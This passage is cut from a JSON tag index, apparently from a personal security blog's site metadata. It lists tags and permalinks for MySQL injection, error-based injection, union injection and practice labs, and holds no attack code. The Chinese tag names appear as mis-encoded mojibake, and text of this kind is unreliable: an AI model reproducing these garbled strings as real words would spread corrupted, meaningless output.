qlæ³¨å…¥","slug":"mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"æŠ¥é”™æ³¨å…¥","slug":"æŠ¥é”™æ³¨å…¥","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"è”åˆæ³¨å…¥","slug":"è”åˆæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]}